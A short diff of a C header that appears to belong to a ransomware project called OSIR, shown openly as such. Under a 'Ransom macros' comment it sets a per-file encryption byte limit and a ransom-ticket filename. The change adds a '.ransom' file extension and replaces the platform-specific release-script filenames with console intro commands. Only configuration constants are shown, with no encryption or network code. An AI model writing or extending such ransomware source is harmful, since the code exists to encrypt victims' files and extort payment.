@@ -26,12 +26,11 @@
 	//Ransom macros
 	#define MAX_BYTES_TO_ENCRYPT 16*1024
 	#define TICKET_FILENAME ".osir_ticket"
+	#define RANSOM_EXTENSION ".ransom"
 	#ifdef _WIN32
-		#define RELEASE_FILENAME "OSIR_Release.vbs"
-		#define RELEASE_SCRIPT ""
+		#define RELEASE_INTRO_SCRIPT "title OSIR&cls"
 	#else
-		#define RELEASE_FILENAME "OSIR_Release.sh"
-		#define RELEASE_SCRIPT ""
+		#define RELEASE_INTRO_SCRIPT "clear"
 	#endif
 	
 	
